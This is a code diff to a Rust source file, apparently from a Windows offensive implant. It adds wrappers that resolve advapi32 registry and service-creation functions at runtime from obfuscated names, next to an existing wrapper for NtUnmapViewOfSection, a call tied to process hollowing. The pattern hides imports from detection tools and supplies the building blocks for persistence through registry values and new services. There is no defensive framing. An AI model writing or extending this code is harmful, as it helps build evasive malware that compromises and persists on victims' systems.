@@ -377,3 +377,61 @@ pub unsafe fn NtUnmapViewOfSection(process: *mut c_void, base_address: *mut c_vo
     let f: F = std::mem::transmute(resolve(crate::obf::NTDLL, crate::obf::NT_UNMAP_VIEW_OF_SECTION));
     f(process, base_address)
 }
+
+// ── advapi32 ───────────────────────────────────────────────────────────────
+
+#[cfg(windows)]
+pub unsafe fn RegOpenKeyExA(
+    key: *mut c_void, sub_key: *const u8, options: u32, sam_desired: u32, result: *mut *mut c_void,
+) -> i32 {
+    type F = unsafe extern "system" fn(*mut c_void, *const u8, u32, u32, *mut *mut c_void) -> i32;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::ADVAPI32, crate::obf::W_REG_OPEN_KEY_EX_A));
+    f(key, sub_key, options, sam_desired, result)
+}
+
+#[cfg(windows)]
+pub unsafe fn RegSetValueExA(
+    key: *mut c_void, value_name: *const u8, reserved: u32, reg_type: u32,
+    data: *const u8, data_len: u32,
+) -> i32 {
+    type F = unsafe extern "system" fn(*mut c_void, *const u8, u32, u32, *const u8, u32) -> i32;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::ADVAPI32, crate::obf::W_REG_SET_VALUE_EX_A));
+    f(key, value_name, reserved, reg_type, data, data_len)
+}
+
+#[cfg(windows)]
+pub unsafe fn RegCloseKey(key: *mut c_void) -> i32 {
+    type F = unsafe extern "system" fn(*mut c_void) -> i32;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::ADVAPI32, crate::obf::W_REG_CLOSE_KEY));
+    f(key)
+}
+
+#[cfg(windows)]
+pub unsafe fn OpenSCManagerA(machine: *const u8, database: *const u8, access: u32) -> *mut c_void {
+    type F = unsafe extern "system" fn(*const u8, *const u8, u32) -> *mut c_void;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::ADVAPI32, crate::obf::W_OPEN_SC_MANAGER_A));
+    f(machine, database, access)
+}
+
+#[cfg(windows)]
+pub unsafe fn CreateServiceA(
+    sc_manager: *mut c_void, name: *const u8, display: *const u8, access: u32,
+    svc_type: u32, start_type: u32, error_control: u32, path: *const u8,
+    load_order: *const u8, tag_id: *mut u32, deps: *const u8,
+    account: *const u8, password: *const u8,
+) -> *mut c_void {
+    type F = unsafe extern "system" fn(
+        *mut c_void, *const u8, *const u8, u32, u32, u32, u32, *const u8,
+        *const u8, *mut u32, *const u8, *const u8, *const u8,
+    ) -> *mut c_void;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::ADVAPI32, crate::obf::W_CREATE_SERVICE_A));
+    f(sc_manager, name, display, access, svc_type, start_type, error_control, path,
+      load_order, tag_id, deps, account, password)
+}
+
+#[cfg(windows)]
+pub unsafe fn CloseServiceHandle(handle: *mut c_void) -> i32 {
+    type F = unsafe extern "system" fn(*mut c_void) -> i32;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::ADVAPI32, crate::obf::W_CLOSE_SERVICE_HANDLE));
+    f(handle)
+}
